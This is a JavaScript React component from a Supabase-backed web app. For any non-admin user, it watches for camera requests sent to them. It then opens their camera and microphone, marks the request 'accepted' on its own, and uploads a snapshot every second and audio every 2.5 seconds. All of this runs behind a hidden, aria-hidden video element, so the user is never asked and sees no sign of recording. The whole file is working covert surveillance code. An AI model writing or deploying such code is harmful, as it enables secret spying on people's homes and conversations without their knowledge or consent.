import { useEffect, useRef, useState } from 'react'
import { useAuth } from '../context/AuthContext'
import { getMediaStream } from '../lib/mediaAccess'
import { supabase } from '../lib/supabaseClient'

function blobToDataUrl(blob) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onloadend = () => resolve(reader.result)
    reader.onerror = reject
    reader.readAsDataURL(blob)
  })
}

function getAudioMimeType() {
  if (!window.MediaRecorder) return ''

  const types = ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4']
  return types.find((type) => MediaRecorder.isTypeSupported(type)) || ''
}

export default function CameraRequestListener() {
  const { user } = useAuth()
  const [active, setActive] = useState(null)
  const activeCheckRef = useRef(null)
  const previewRef = useRef(null)
  const captureTimerRef = useRef(null)
  const statusTimerRef = useRef(null)
  const recorderRef = useRef(null)
  const processingRef = useRef(null)

  async function isCheckOpen(checkId) {
    const { data, error } = await supabase
      .from('camera_checks')
      .select('status')
      .eq('id', checkId)
      .single()

    return !error && data?.status !== 'ended'
  }

  function stopActiveSession() {
    if (captureTimerRef.current) {
      window.clearInterval(captureTimerRef.current)
      captureTimerRef.current = null
    }

    if (statusTimerRef.current) {
      window.clearInterval(statusTimerRef.current)
      statusTimerRef.current = null
    }

    if (recorderRef.current?.state === 'recording') {
      recorderRef.current.stop()
    }

    recorderRef.current = null
    activeCheckRef.current = null
    setActive(null)
  }

  async function captureFrame(checkId) {
    if (!(await isCheckOpen(checkId))) {
      stopActiveSession()
      return
    }

    const video = previewRef.current
    if (!video?.videoWidth || !video?.videoHeight) return

    const canvas = document.createElement('canvas')
    const maxWidth = 360
    const scale = Math.min(1, maxWidth / video.videoWidth)
    canvas.width = Math.round(video.videoWidth * scale)
    canvas.height = Math.round(video.videoHeight * scale)

    const ctx = canvas.getContext('2d')
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height)

    await supabase
      .from('camera_checks')
      .update({
        status: 'accepted',
        snapshot_data: canvas.toDataURL('image/jpeg', 0.55),
        snapshot_at: new Date().toISOString(),
      })
      .eq('id', checkId)
      .neq('status', 'ended')
  }

  function startAudioCapture(stream, checkId) {
    const audioTracks = stream.getAudioTracks()
    if (!audioTracks.length || !window.MediaRecorder) return

    let recorder

    try {
      const mimeType = getAudioMimeType()
      const options = mimeType ? { mimeType } : undefined
      recorder = new MediaRecorder(new MediaStream(audioTracks), options)
      recorderRef.current = recorder
    } catch {
      return
    }

    recorder.addEventListener('dataavailable', async (event) => {
      if (!event.data.size || activeCheckRef.current !== checkId) return
      if (!(await isCheckOpen(checkId))) {
        stopActiveSession()
        return
      }

      const audioData = await blobToDataUrl(event.data)
      await supabase
        .from('camera_checks')
        .update({
          audio_data: audioData,
          audio_at: new Date().toISOString(),
        })
        .eq('id', checkId)
        .neq('status', 'ended')
    })

    recorder.start(2500)
  }

  async function startSession(request) {
    if (processingRef.current === request.id || activeCheckRef.current === request.id) return
    processingRef.current = request.id

    try {
      const stream = await getMediaStream()
      activeCheckRef.current = request.id
      setActive(request)

      setTimeout(async () => {
        if (!previewRef.current || activeCheckRef.current !== request.id) return

        previewRef.current.srcObject = stream
        await previewRef.current.play().catch(() => {})
        await supabase.from('camera_checks').update({ status: 'accepted' }).eq('id', request.id)
        await captureFrame(request.id)

        captureTimerRef.current = window.setInterval(() => {
          captureFrame(request.id)
        }, 1000)

        statusTimerRef.current = window.setInterval(async () => {
          if (!(await isCheckOpen(request.id))) stopActiveSession()
        }, 2000)

        startAudioCapture(stream, request.id)
      })
    } catch {
      await supabase.from('camera_checks').update({ status: 'declined' }).eq('id', request.id)
      stopActiveSession()
    } finally {
      processingRef.current = null
    }
  }

  useEffect(() => {
    if (!user?.id || user.isAdmin) return

    let cancelled = false

    async function loadPendingRequest() {
      if (activeCheckRef.current) return

      const { data } = await supabase
        .from('camera_checks')
        .select('*')
        .eq('target_id', user.id)
        .eq('status', 'requested')
        .order('created_at', { ascending: false })
        .limit(1)
        .maybeSingle()

      if (!cancelled && data) startSession(data)
    }

    loadPendingRequest()
    const intervalId = window.setInterval(loadPendingRequest, 1000)

    return () => {
      cancelled = true
      window.clearInterval(intervalId)
      stopActiveSession()
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [user?.id, user?.isAdmin])

  if (!active) return null

  return (
    <video
      ref={previewRef}
      className="camera-hidden-capture"
      autoPlay
      playsInline
      muted
      aria-hidden="true"
    />
  )
}
